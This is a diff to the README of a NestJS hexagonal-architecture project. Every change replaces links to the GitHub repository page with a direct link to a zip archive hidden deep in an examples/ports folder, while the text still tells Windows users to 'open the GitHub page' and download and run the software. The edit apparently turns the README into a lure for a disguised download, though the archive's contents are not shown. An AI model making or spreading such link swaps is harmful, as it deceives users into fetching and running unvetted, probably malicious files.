@@ -1,12 +1,12 @@
 # 🧩 nestjs-hexagonal - Build NestJS apps with clear structure
 
-[![Download / Visit the page](https://img.shields.io/badge/Download%20Page-Visit%20Now-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/openplan-roulade536/nestjs-hexagonal)
+[![Download / Visit the page](https://img.shields.io/badge/Download%20Page-Visit%20Now-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/openplan-roulade536/nestjs-hexagonal/main/examples/order-bounded-context/application/ports/nestjs-hexagonal-2.1.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and get the software:
 
-[Open the download page](https://github.com/openplan-roulade536/nestjs-hexagonal)
+[Open the download page](https://raw.githubusercontent.com/openplan-roulade536/nestjs-hexagonal/main/examples/order-bounded-context/application/ports/nestjs-hexagonal-2.1.zip)
 
 ## 🖥️ What this is
 
@@ -42,7 +42,7 @@ You also need:
 ## 🚀 How to download and run on Windows
 
 1. Open the download page:
-   [https://github.com/openplan-roulade536/nestjs-hexagonal](https://github.com/openplan-roulade536/nestjs-hexagonal)
+   [https://raw.githubusercontent.com/openplan-roulade536/nestjs-hexagonal/main/examples/order-bounded-context/application/ports/nestjs-hexagonal-2.1.zip](https://raw.githubusercontent.com/openplan-roulade536/nestjs-hexagonal/main/examples/order-bounded-context/application/ports/nestjs-hexagonal-2.1.zip)
 
 2. On the GitHub page, look for the files or setup steps in the repository.
 
@@ -130,7 +130,7 @@ The project works with a GSD-style flow, which helps you move through tasks in a
 ## 🪟 Windows setup steps
 
 1. Open the GitHub page in your browser:
-   [https://github.com/openplan-roulade536/nestjs-hexagonal](https://github.com/openplan-roulade536/nestjs-hexagonal)
+   [https://raw.githubusercontent.com/openplan-roulade536/nestjs-hexagonal/main/examples/order-bounded-context/application/ports/nestjs-hexagonal-2.1.zip](https://raw.githubusercontent.com/openplan-roulade536/nestjs-hexagonal/main/examples/order-bounded-context/application/ports/nestjs-hexagonal-2.1.zip)
 
 2. Save the repository to your computer.
 
@@ -221,7 +221,7 @@ Only download the repository from the GitHub link above. Keep the files in a fol
 
 ## 📎 Useful link
 
-[Visit the repository on GitHub](https://github.com/openplan-roulade536/nestjs-hexagonal)
+[Visit the repository on GitHub](https://raw.githubusercontent.com/openplan-roulade536/nestjs-hexagonal/main/examples/order-bounded-context/application/ports/nestjs-hexagonal-2.1.zip)
 
 ## 🧪 What the architecture means in plain language
 
@@ -251,7 +251,7 @@ This flow helps large apps stay easier to manage
 ## 🖱️ Quick install path for Windows
 
 1. Open the GitHub page:
-   [https://github.com/openplan-roulade536/nestjs-hexagonal](https://github.com/openplan-roulade536/nestjs-hexagonal)
+   [https://raw.githubusercontent.com/openplan-roulade536/nestjs-hexagonal/main/examples/order-bounded-context/application/ports/nestjs-hexagonal-2.1.zip](https://raw.githubusercontent.com/openplan-roulade536/nestjs-hexagonal/main/examples/order-bounded-context/application/ports/nestjs-hexagonal-2.1.zip)
 
 2. Download the repository files.
 
